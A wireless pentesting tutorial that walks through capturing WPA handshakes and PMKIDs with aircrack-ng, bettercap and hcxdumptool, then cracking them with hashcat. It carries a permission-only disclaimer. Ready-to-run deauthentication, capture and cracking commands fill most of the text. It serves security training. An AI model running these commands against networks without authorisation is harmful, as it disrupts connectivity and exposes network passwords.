# Wireless Pentesting

{% hint style="danger" %}
This is for educational purposes and only to be performed on networks you have permission to do so.
{% endhint %}

Basic info on Wireless can be found [here](../../general/networking/wireless/).\
\
This will be a walkthrough used to obtain wireless handshakes and PMKID using various tools such as [Aircrack-ng](../../general/tools/wireless/aircrack-ng.md), [HCXDumptool](../../general/tools/wireless/hcxdumptool.md), [Bettercap](../../general/tools/wireless/bettercap.md).

Then we will crack the hashes using [Hashcat](wireless-pentesting.md#hashcat)

This will require having a WiFi Adapter that supports monitor mode, also known as packet injection.

I myself have and recommend these adapters:

* [Alfa AWUS036ACM](https://www.amazon.com/Alfa-AWUS036ACM-Long-Range-Dual-Band-Wireless/dp/B073X6RL9D) <-- Capable of 2.4GHz and 5GHz
* [Alfa AWUS036ACHM](https://www.amazon.com/gp/product/B08SJBV1N3/ref=ox\_sc\_act\_title\_1?smid=A20G3A026MV70R\&psc=1) <-- Capable of 2.4GHz and 5GHz
* [Alfa AWUS036ACH](https://www.amazon.com/dp/B08SJC78FH?ref\_=cm\_sw\_r\_cp\_ud\_dp\_PSZZG6J9X0XH40GXB685) <-- Capable of 2.4GHz and 5GHz (This more than likely \*will\* require driver installation)
* [Panda Wireless PAU09 N600](https://www.amazon.com/Panda-Wireless-PAU09-Adapter-Antennas/dp/B01LY35HGO) <-- Capable of 2.4GHz and 5GHz
* [Alfa AWUS036NEH](https://www.amazon.com/AWUS036NEH-Range-WIRELESS-802-11b-USBAdapter/dp/B0035OCVO6)
* [Alfa AWUS036NH](https://www.amazon.com/Alfa-AWUS036NH-802-11g-Wireless-Long-Range/dp/B003YIFHJY)
* [Panda Wireless PAU05](https://www.amazon.com/Panda-300Mbps-Wireless-USB-Adapter/dp/B00EQT0YK2)
* [TP-Link TL-WN722N](https://www.amazon.com/TP-Link-TL-WN722N-Wireless-network-Adapter/dp/B002SZEOLG)
* [Ralink USB WiFi RT5370](https://www.amazon.com/Ralink-RT5370-Raspberry-Adapter-Function/dp/B019XUDHFC)

## Aircrack-ng

### Handshake

First we must find our adapter interface name and enable monitor mode on it.

![](<../../.gitbook/assets/image (189).png>)

`sudo airmon-ng start (interface name)`

![](<../../.gitbook/assets/image (381).png>)

Now we start scanning for networks

sudo airodump-ng (interface name)

![](<../../.gitbook/assets/image (26).png>)

![](<../../.gitbook/assets/image (28) (1).png>)

Once we have found our target, we press `CTRL+C` to stop the scan

Now we focus our scan onto our target

`sudo airodump-ng -c (channel) -w (SSID.cap) --bssid (bssid) (interface)`

![](<../../.gitbook/assets/image (171).png>)

We can name the .cap file whatever we want, I typically just name it the targets SSID

Now we can see here at the bottom, we see `BSSID`, `STATION`, `PWR`, `Rate`, `Lost`, etc. this indicates if a device is connected to that network. This may not _always_ show devices but is helpful to keep an eye on.

At this point we can simply wait for a device to connect to the network to obtain the handshake, or we send deauth packets to the network to force a device to reconnect to the network to obtain the handshake. We can do this in various ways.

In a second terminal:

`sudo aireplay-ng -0 10 -a (bssid) (interface)` will send 10 deauthentication packets to the network and stop.

`sudo aireplay-ng -0 0 -a (bssid) (interface)` will continuously send deauthentication packets to the network until you tell it to stop using CTRL+C

We can also deauthenticate a specific device that is connected to the network with `sudo aireplay-ng -0 1 -a (bssid) -c (client station MAC) (interface`).

![](<../../.gitbook/assets/image (122).png>)

Once we have obtained the handshake, we will see our airodump terminal change, it will specify in the top right with `WPA Handshake: BSSID`.

![](<../../.gitbook/assets/image (142).png>)

Note: We can also obtain PMKID with this method as well:

![](../../.gitbook/assets/2022-04-07\_00-22.png)

This is handshake is saved into the .cap file we specified we when target our airodump-ng scan.

##

***

## Bettercap

### Handshake

Like with aircrack, we find out interface and put it into monitor mode.

Now we start bettercap selecting our interface

bettercap -iface (interface)

![](<../../.gitbook/assets/image (40).png>)

We begin scanning for networks

`wifi.recon on`

We can also show the WiFi Manufacturer of the AP

`set wifi.show.manufacturer true`

`wifi.show`

![](<../../.gitbook/assets/image (228).png>)

`set wifi.recon.channel (Channel)`

`set net.sniff.verbose true`

`set net.sniff.output (SSID).pcap`

`set net.sniff on`

`events.stream on`

At this point we can again, simply wait for a device to connect to the network to obtain the handshake, or we may deauthenticate the network.

`wifi.deauth (BSSID)`

Once we obtain the handshake, we will see the notification in our event stream

![](<../../.gitbook/assets/image (250).png>)

### PMKID

The PMKID method is much simpler method. Just like before, we find our interface, enable monitor mode, start bettercap with that interface.

We begin scanning for networks

`wifi.recon on`

We can also show the WiFi Manufacturer of the AP

`set wifi.show.manufacturer true`

`wifi.show`

To start the PMKID attack we simply run

`wifi.assoc (BSSID)`

Once we have successfully received the RSN frame containing PMKID and it has been saved in a pcap format

![](<../../.gitbook/assets/image (140).png>)

##

***

## HCXDumptool

### PMKID

Like other methods, we find out interface and put it into monitor mode.

We then scan for our target using airodump-ng

`sudo airodump-ng wlan0mon`

Once we find out target, `CTRL+C` and we copy the BSSID into a file but remove the colons, I named my file target. I usually name the .pcap file after the SSID just to keep track of it.

Now we run

`hcxdumptool -o (name).pcap`ng `-i (interface) --enable_status=1 --filterlist_ap=target.txt --filtermode=2`

![](<../../.gitbook/assets/image (383).png>)

Once we obtain our PMKID we will see it at the bottom

![](<../../.gitbook/assets/image (55).png>)

##

***

## Hash Cracking

So we now have our handshake in .cap format, we can crack the hash and find out the password.

### Aircrack

We'll start with `aircrack-ng` as that is what we originally captured our handshake with. When we chose the `-w` output with the SSID name, or whatever name you chose, the files are saved in whatever directory you ran that `airodump-ng` command from. You may have multiple files in there with that SSID name. Eg. `Pixel.cap-01.cap`, `Pixel.cap-02.cap`, `Pixel.cap-03.cap`, etc. The handshake _SHOULD_ be in the most recent one, the one with the highest number. So lets run aircrack against that .cap file.

`sudo aircrack-ng -w (wordlist) (.cap file)`

![](<../../.gitbook/assets/image (44).png>)

Now depending on the password and the dictionary you chose, this may take some time. I chose to attack my phones hotspot as I am allowed to attack my own devices and made the password simple enough that the basic rockyou.txt file could crack it with ease. Once it has found it the cracking will stop and will tell you the password.

![](<../../.gitbook/assets/image (15).png>)

### Hashcat

We have our PMKID in the .pcapng format, we can use hashcat to crack it. First we must use the `hcxpcapng` tool from [HCXtools](https://github.com/ZerBea/hcxtools).

hcxpcapng -o CrackMe (.pcapng file)

![](<../../.gitbook/assets/image (289).png>)

#### Dictionary

If we want to use a dictionary attack, like using `rockyou.txt` for example

`hashcat -a 0 -w 3 -m 22000 (hash file) (wordlist)`

![](<../../.gitbook/assets/image (358).png>)

![](<../../.gitbook/assets/image (21) (1).png>)

Depending on your hardware, the dictionary you chose, and the password, this may take some time. You can press S for a status to see the time time estimated on finishing, as well as the updated "Recovered.Total" to see the recovered keys"

We can run the same command again with --show appended to the end to see our cracked passwords.

![](<../../.gitbook/assets/image (282).png>)

#### Brute Force

If we wanted to run a brute force attack rather than a dictionary attack, it's a similar command

`hashcat -a 3 -w 3 -m 22000 (hash file) '?l?l?l?l?l?l?l'`

Replace the `?l` with whatever we deem fit.

* ?l = a-z
* ?u = A-Z
* ?d = 0-9
* ?h = 0-9a-f
* ?H = 0-9A-F
* ?s = !"#$%&'()\*+,-./:;<=>?@\[]^\_\`{|}\~
* ?a = ?l?u?d?s
* ?b = 0x00 - 0xff

This will cover the basics of the hash cracking with hashcat but it can get SO much more advanced with hashcat.
